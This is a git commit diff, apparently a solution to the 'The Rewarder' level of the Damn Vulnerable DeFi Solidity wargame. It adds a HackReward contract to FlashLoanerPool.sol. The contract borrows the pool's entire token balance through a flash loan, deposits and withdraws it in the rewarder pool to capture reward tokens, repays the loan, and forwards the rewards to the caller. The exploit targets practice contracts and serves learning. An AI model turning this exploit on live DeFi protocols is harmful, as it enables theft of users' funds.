12392b1d7e6a91a7de08d0e82629d0f5f731338b
Ashutosh Kumar <ashu3324tosh@gmail.com>
2022-08-17 14:30:10 +0530

    rewarder

--- contracts/the-rewarder/FlashLoanerPool.sol
+++ contracts/the-rewarder/FlashLoanerPool.sol
@@ -40,3 +40,34 @@ contract FlashLoanerPool is ReentrancyGuard {
         require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
     }
 }
+
+import "./TheRewarderPool.sol";
+import "./RewardToken.sol";
+
+contract HackReward {
+    FlashLoanerPool public pool;
+    DamnValuableToken public token;
+    TheRewarderPool public rewardPool;
+    RewardToken public reward;
+
+    constructor(address _pool, address _token, address _rewardPool, address _reward){
+        pool = FlashLoanerPool(_pool);
+        token = DamnValuableToken(_token);
+        rewardPool = TheRewarderPool(_rewardPool);
+        reward = RewardToken(_reward);
+    }
+
+    fallback() external {
+        uint bal = token.balanceOf(address(this));
+        token.approve(address(rewardPool), bal);
+        rewardPool.deposit(bal);
+        rewardPool.withdraw(bal);
+        token.transfer(address(pool), bal);
+    }
+
+    function attack() external {
+        pool.flashLoan(token.balanceOf(address(pool)));
+        reward.transfer(msg.sender, reward.balanceOf(address(this)));
+    }
+
+}
